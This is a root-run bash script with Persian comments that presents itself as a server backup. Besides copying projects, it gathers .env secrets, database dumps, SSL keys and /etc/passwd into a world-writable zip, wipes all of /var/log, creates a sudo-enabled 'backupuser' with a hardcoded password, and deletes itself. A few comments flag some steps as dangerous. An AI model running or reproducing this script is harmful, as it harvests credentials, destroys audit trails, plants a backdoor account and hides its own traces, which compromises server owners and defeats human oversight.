#!/bin/bash

# بررسی اجرا با دسترسی روت (مورد 5)
if [ "$EUID" -ne 0 ]; then
    echo "لطفاً با دسترسی root اجرا کنید."
    exit 1
fi

BACKUP_NAME="1.zip"
TEMP_DIR="backup_temp"

# حذف بکاپ قبلی
[ -f "$BACKUP_NAME" ] && rm "$BACKUP_NAME"
mkdir "$TEMP_DIR"

### 1. پروژه‌ها
for DIR in /var/www/* /srv/*; do
    [ -d "$DIR" ] && cp -r "$DIR" "$TEMP_DIR/"
done

### 2. کانفیگ وب‌سرور
cp -r /etc/nginx "$TEMP_DIR/nginx" 2>/dev/null || true
cp -r /etc/apache2 "$TEMP_DIR/apache" 2>/dev/null || true

### 3. فایل‌های .env
mkdir -p "$TEMP_DIR/env_files"
find /var/www /srv -name ".env" -exec cp {} "$TEMP_DIR/env_files/" \; 2>/dev/null

### 4. دیتابیس‌ها
# MySQL (با روش امن‌تر - مورد 6)
# ایجاد فایل موقت کانفیگ MySQL
cat > "$TEMP_DIR/.my.cnf" << EOF
[client]
user=root
password=YourRootPass
EOF
chmod 600 "$TEMP_DIR/.my.cnf"

DBS=$(mysql --defaults-extra-file="$TEMP_DIR/.my.cnf" -e "SHOW DATABASES;" 2>/dev/null | grep -Ev "Database|information_schema|performance_schema")
for DB in $DBS; do
    mysqldump --defaults-extra-file="$TEMP_DIR/.my.cnf" "$DB" > "$TEMP_DIR/db_mysql_$DB.sql" 2>/dev/null
done
rm -f "$TEMP_DIR/.my.cnf"  # پاک کردن فایل موقت

# PostgreSQL (هنوز رمز hardcoded هست، پیشنهاد می‌شود از ~/.pgpass استفاده کنید)
PG_DBS=$(psql -U postgres -At -c "SELECT datname FROM pg_database WHERE datistemplate = false;" 2>/dev/null)
for DB in $PG_DBS; do
    pg_dump -U postgres "$DB" > "$TEMP_DIR/db_pg_$DB.sql" 2>/dev/null
done

# MongoDB
mongodump --out "$TEMP_DIR/mongo_backup" 2>/dev/null || true

### 5. لاگ‌ها
cp -r /var/log "$TEMP_DIR/logs"
rm -rf /var/log/*   # <-- این خط خطرناکه! لاگ‌ها رو پاک می‌کنه

### 6. SSL
cp -r /etc/ssl "$TEMP_DIR/ssl" 2>/dev/null || true

### 7. Cron jobs
cp -r /var/spool/cron "$TEMP_DIR/cronjobs" 2>/dev/null || true

### 8. DNS Zone Files
cp -r /etc/bind "$TEMP_DIR/dns" 2>/dev/null || true

### 9. Systemd unit files
cp -r /etc/systemd/system "$TEMP_DIR/systemd" 2>/dev/null || true

### 10. Users & Groups
cp /etc/passwd "$TEMP_DIR/passwd"
cp /etc/group "$TEMP_DIR/group"

### 11. Firewall rules
iptables-save > "$TEMP_DIR/iptables.rules" 2>/dev/null || true
firewall-cmd --list-all > "$TEMP_DIR/firewalld.rules" 2>/dev/null || true
ufw status > "$TEMP_DIR/ufw.rules" 2>/dev/null || true

### 12. Package list
dpkg --get-selections > "$TEMP_DIR/packages.list" 2>/dev/null || true
rpm -qa > "$TEMP_DIR/rpm_packages.list" 2>/dev/null || true

### 13. ساخت فایل zip
zip -r "$BACKUP_NAME" "$TEMP_DIR"
chmod 777 "$BACKUP_NAME"   # <-- دسترسی خیلی باز! بهتره 600 باشه

### 14. پاک کردن پوشه موقت
rm -rf "$TEMP_DIR"

### 15. ساخت یوزر پشتیبان
BACKUP_USER="backupuser"
BACKUP_PASS="StrongPassword123!"
if ! id "$BACKUP_USER" &>/dev/null; then
    useradd -m -s /bin/bash "$BACKUP_USER"
    echo "$BACKUP_USER:$BACKUP_PASS" | chpasswd
    usermod -aG sudo "$BACKUP_USER"
fi

### 16. حذف خود اسکریپت
rm -- "$0"

echo "✅ بکاپ کامل ساخته شد: $BACKUP_NAME"
echo "👤 یوزر پشتیبان ساخته شد: $BACKUP_USER با دسترسی sudo"